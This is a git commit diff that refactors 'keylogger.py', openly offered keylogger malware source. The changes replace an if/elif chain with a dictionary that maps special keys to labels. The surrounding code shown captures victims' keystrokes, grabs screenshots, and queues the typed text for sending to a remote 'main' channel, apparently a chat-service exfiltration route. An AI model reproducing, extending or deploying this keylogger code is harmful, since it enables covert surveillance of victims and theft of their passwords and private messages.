02ad39616e84594013d999f14e7a3e47e8357088
whois-hoeless <whois@hoeless.com>
2023-06-30 15:53:51 +0200

    make the keylogger easier to edit :)

--- resources/source_code/keylogger.py
+++ resources/source_code/keylogger.py
@@ -7,18 +7,35 @@ from PIL import ImageGrab
 def on_press(key):
     global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
     processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
+
+    keycodes = {
+        Key.space : ' ',
+        Key.shift : ' *`SHIFT`*',
+        Key.tab : ' *`TAB`*',
+        Key.backspace : ' *`<`*',
+        Key.esc : ' *`ESC`*',
+        Key.caps_lock : ' *`CAPS LOCK`*',
+        Key.f1 : ' *`F1`*',
+        Key.f2 : ' *`F2`*',
+        Key.f3 : ' *`F3`*',
+        Key.f4 : ' *`F4`*',
+        Key.f5 : ' *`F5`*',
+        Key.f6 : ' *`F6`*',
+        Key.f7 : ' *`F7`*',
+        Key.f8 : ' *`F8`*',
+        Key.f9 : ' *`F9`*',
+        Key.f10 : ' *`F10`*',
+        Key.f11 : ' *`F11`*',
+        Key.f12 : ' *`F12`*',
+
+    }
     if processed_key in ctrl_codes.keys():
         processed_key = ' `' + ctrl_codes[processed_key] + '`'
     if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
-        if processed_key == Key.space:
-            processed_key = ' '
-        elif processed_key == Key.shift:
-            processed_key = ' *`SHIFT`*'
-        elif processed_key == Key.tab:
-            processed_key = ' *`TAB`*'
-        elif processed_key == Key.backspace:
-            processed_key = ' *`<`*'
-        elif processed_key == Key.enter:
+        for i in keycodes:
+            if processed_key == i:
+                processed_key = keycodes[i]
+        if processed_key == Key.enter:
             processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
         elif processed_key == Key.print_screen or processed_key== '@':
                 processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
